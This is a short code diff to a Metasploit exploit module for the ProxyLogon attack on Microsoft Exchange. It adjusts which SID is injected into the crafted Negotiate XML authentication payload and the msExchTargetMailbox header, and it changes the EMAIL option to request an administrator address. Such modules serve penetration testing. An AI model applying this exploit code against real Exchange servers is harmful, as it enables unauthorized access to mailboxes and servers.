@@ -93,7 +93,7 @@ class MetasploitModule < Msf::Exploit::Remote
     )
 
     register_options([
-      OptString.new('EMAIL', [true, 'A known email address for this organization']),
+      OptString.new('EMAIL', [true, 'A known administrator email address']),
       OptEnum.new('METHOD', [true, 'HTTP Method to use for the check', 'POST', ['GET', 'POST']])
     ])
 
@@ -256,7 +256,7 @@ class MetasploitModule < Msf::Exploit::Remote
   end
 
   def request_proxylogon(server_name)
-    data = "<r at=\"Negotiate\" ln=\"#{rand_text_alpha(4..8)}\"><s>#{patch_sid}</s><s a=\"7\" t=\"1\">S-1-1-0</s><s a=\"7\" t=\"1\">S-1-5-2</s><s a=\"7\" t=\"1\">S-1-5-11</s><s a=\"7\" t=\"1\">S-1-5-15</s><s a=\"3221225479\" t=\"1\">S-1-5-5-0-6948923</s></r>"
+    data = "<r at=\"Negotiate\" ln=\"#{rand_text_alpha(4..8)}\"><s>#{@sid}</s><s a=\"7\" t=\"1\">S-1-1-0</s><s a=\"7\" t=\"1\">S-1-5-2</s><s a=\"7\" t=\"1\">S-1-5-11</s><s a=\"7\" t=\"1\">S-1-5-15</s><s a=\"3221225479\" t=\"1\">S-1-5-5-0-6948923</s></r>"
 
     session_id = ''
     canary = ''
@@ -368,7 +368,7 @@ class MetasploitModule < Msf::Exploit::Remote
     unless @sid.empty?
       headers = {
         'msExchLogonMailbox' => patch_sid,
-        'msExchTargetMailbox' => patch_sid,
+        'msExchTargetMailbox' => @sid,
         'msExchLogonAccount' => @legacy_dn
       }
       request = request.merge('headers' => headers)
